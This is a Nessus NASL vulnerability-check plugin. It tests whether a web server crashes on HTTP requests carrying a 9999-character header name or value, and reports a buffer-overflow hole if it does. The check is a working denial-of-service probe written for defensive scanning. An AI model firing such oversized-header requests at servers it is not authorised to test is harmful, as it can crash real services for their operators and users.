#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(11078);
 script_version ("$Revision: 1.22 $");

 script_name(english:"Web Server HTTP Header Handling Remote Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host is running a web server with a remote buffer overflow
vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to kill the web server by sending an invalid request
with a long header name or value.

A remote attacker may exploit this vulnerability to make the web server
crash continually or even execute arbitrary code." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version of the software or protect it with a
filtering reverse proxy." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();

 
 script_summary(english:"Attempts to overflow the HTTP header buffer");
 
 script_category(ACT_DENIAL);
# All the www_too_long_*.nasl scripts were first declared as 
# ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
# The web server might be killed by those generic tests before Nessus 
# has a chance to perform known attacks for which a patch exists
# As ACT_DENIAL are performed one at a time (not in parallel), this reduces
# the risk of false positives.
 
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_require_ports("Services/www", 80);
 script_dependencie("httpver.nasl", "http_version.nasl");
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

########

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) exit(0);

port = get_http_port(default:80);

if (http_is_dead(port: port)) exit(0);

w = http_send_recv3(method: "GET", item:"/", port:port,
  add_headers: make_array("Nessus-Header", crap(9999)));

if (isnull(w))
  if (http_is_dead(port: port, retry: 3))
  {
    security_hole(port);
    exit(0);
  }

w = http_send_recv3(method: "GET", item:"/", port:port,
  add_headers: make_array(crap(9999), "Nessus was here"));

if (http_is_dead(port: port, retry: 3)) security_hole(port);
